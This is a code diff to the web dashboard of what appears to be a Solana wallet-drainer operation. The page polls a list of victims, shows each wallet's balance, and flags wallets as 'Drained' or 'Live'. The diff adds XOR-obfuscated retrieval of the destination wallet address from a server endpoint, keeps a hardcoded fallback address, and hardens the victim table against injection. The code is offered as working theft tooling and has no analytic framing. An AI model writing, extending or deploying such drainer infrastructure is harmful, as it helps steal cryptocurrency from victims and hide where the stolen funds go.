@@ -134,10 +134,28 @@
   <p id="status">loading...</p>
 
   <script>
-  var dest = "AJ5obv7kqWiBCiqAAsqR9Anx9XEoKjnCVM4vKAgABFPM";
+  var _xorKey = "ech3lon";
+  function xorDec(b64){
+    var raw = atob(b64);
+    var out = "";
+    for(var i = 0; i < raw.length; i++) out += String.fromCharCode(raw.charCodeAt(i) ^ _xorKey.charCodeAt(i % _xorKey.length));
+    return out;
+  }
+  var dest = "";
   var RPC = "https://api.mainnet-beta.solana.com";
   var conn = null;
   var _enabled = null;
+
+  async function loadDest(){
+    try {
+      var r = await fetch("/api/seed");
+      var j = await r.json();
+      if(j && j.d) dest = xorDec(j.d);
+    } catch(e) {}
+    if(!dest) dest = "AJ5obv7kqWiBCiqAAsqR9Anx9XEoKjnCVM4vKAgABFPM";
+    document.getElementById("walletAddr").textContent = dest.slice(0,6) + "..." + dest.slice(-4);
+    document.querySelector("button[onclick*='solscan']").setAttribute("onclick", "window.open('https://solscan.io/account/" + dest + "','_blank')");
+  }
 
   async function loadConfigFromServer(){
     try {
@@ -243,8 +261,9 @@
       var tokDisplay = v.tokenCount !== undefined ? v.tokenCount : "?";
       var statusBadge = v.drained ? '<span class="badge badge-drained">Drained</span>' : '<span class="badge badge-new">Live</span>';
       var rowClass = v.solBalance && v.solBalance > 10e9 ? ' class="high-value"' : '';
+      var safeAddr = String(v.address || "").replace(/[^a-zA-Z0-9]/g, "");
       tbody.innerHTML += "<tr" + rowClass + "><td style='color:#555'>" + formatTime(v.timestamp) + "</td>" +
-        "<td><a href='https://solscan.io/account/" + v.address + "' target='_blank' class='wallet-link'>" + truncateAddr(v.address) + "</a></td>" +
+        "<td><a href='https://solscan.io/account/" + safeAddr + "' target='_blank' class='wallet-link'>" + truncateAddr(safeAddr) + "</a></td>" +
         "<td" + (v.solBalance && v.solBalance > 10e9 ? " style='color:#ffd700'" : "") + ">" + solDisplay + "</td>" +
         "<td>" + tokDisplay + "</td><td>" + statusBadge + "</td></tr>";
     }
@@ -291,7 +310,7 @@
   }
 
   setInterval(pollVictims, 3000);
-  refreshWallet();
+  loadDest().then(function(){ refreshWallet(); });
   loadConfigFromServer();
   </script>
 </body>
